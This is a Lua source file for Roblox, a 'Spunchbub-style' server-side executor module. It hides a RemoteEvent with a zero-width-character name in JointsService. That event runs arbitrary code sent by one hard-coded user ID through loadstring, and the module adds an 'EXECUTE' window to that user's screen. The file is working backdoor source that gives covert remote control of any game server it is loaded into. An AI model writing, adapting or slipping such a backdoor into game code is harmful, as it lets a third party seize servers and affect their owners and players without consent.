-- [[ SPUNCHBUB-STYLE SS EXECUTOR MODULE ]]
return function()
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local JointsService = game:GetService("JointsService")

    -- [[ CONFIGURATION ]]
    local MY_USER_ID = 12345678 -- *** CHANGE THIS TO YOUR ACTUAL USERID ***
    local MY_USERNAME = "Shookenblook" -- *** CHANGE THIS TO YOUR USERNAME ***

    -- 1. Setup the RemoteEvent (Hidden in JointsService)
    local RemoteName = "\226\128\139Spunch_" .. HttpService:GenerateGUID(false):sub(1,5)
    local remote = Instance.new("RemoteEvent")
    remote.Name = RemoteName
    remote.Parent = JointsService

    -- 2. The Server-Side Execution Logic
    remote.OnServerEvent:Connect(function(player, code)
        -- SECURITY: Only allow YOU to execute code. 
        -- This prevents other players from hijacking your SS.
        if player.UserId ~= MY_USER_ID and player.Name ~= MY_USERNAME then return end 

        local success, result = pcall(function()
            local func = loadstring(code)
            if func then 
                func() 
            else
                error("Syntax Error in script.")
            end
        end)
        
        if not success then
            warn("Sunc/Spunch Error: " .. tostring(result))
        end
    end)

    -- 3. The UI Injector
    local function injectUI(player)
        -- Only show the UI for you
        if player.UserId ~= MY_USER_ID and player.Name ~= MY_USERNAME then return end

        local pGui = player:WaitForChild("PlayerGui", 10)
        if not pGui then return end

        local sg = Instance.new("ScreenGui", pGui)
        sg.Name = "SpunchbubUI"
        sg.ResetOnSpawn = false
        sg.IgnoreGuiInset = true -- Makes it easier to position

        local frame = Instance.new("Frame", sg)
        frame.Size = UDim2.new(0, 350, 0, 250)
        frame.Position = UDim2.new(0.5, -175, 0.5, -125)
        frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
        frame.BorderSizePixel = 0
        frame.Active = true
        frame.Draggable = true -- Allows you to move the menu around

        local title = Instance.new("TextLabel", frame)
        title.Size = UDim2.new(1, 0, 0, 30)
        title.Text = "  SPUNCHBUB SS | " .. player.Name
        title.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
        title.TextColor3 = Color3.new(1, 1, 1)
        title.TextXAlignment = Enum.TextXAlignment.Left

        local box = Instance.new("TextBox", frame)
        box.Size = UDim2.new(1, -20, 1, -80)
        box.Position = UDim2.new(0, 10, 0, 40)
        box.Text = "-- Enter Server Code"
        box.ClearTextOnFocus = false
        box.MultiLine = true
        box.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
        box.TextColor3 = Color3.fromRGB(200, 200, 200)
        box.TextXAlignment = Enum.TextXAlignment.Left
        box.TextYAlignment = Enum.TextYAlignment.Top

        local btn = Instance.new("TextButton", frame)
        btn.Size = UDim2.new(1, -20, 0, 30)
        btn.Position = UDim2.new(0, 10, 1, -35)
        btn.Text = "EXECUTE"
        btn.BackgroundColor3 = Color3.fromRGB(100, 50, 200)
        btn.TextColor3 = Color3.new(1, 1, 1)
        btn.AutoButtonColor = true

        btn.MouseButton1Click:Connect(function()
            remote:FireServer(box.Text)
        end)
    end

    -- Inject for all current and future players
    for _, p in pairs(Players:GetPlayers()) do 
        task.spawn(function() injectUI(p) end) 
    end
    Players.PlayerAdded:Connect(injectUI)

    print("Spunchbub SS Module Loaded. User: " .. MY_USERNAME)
end
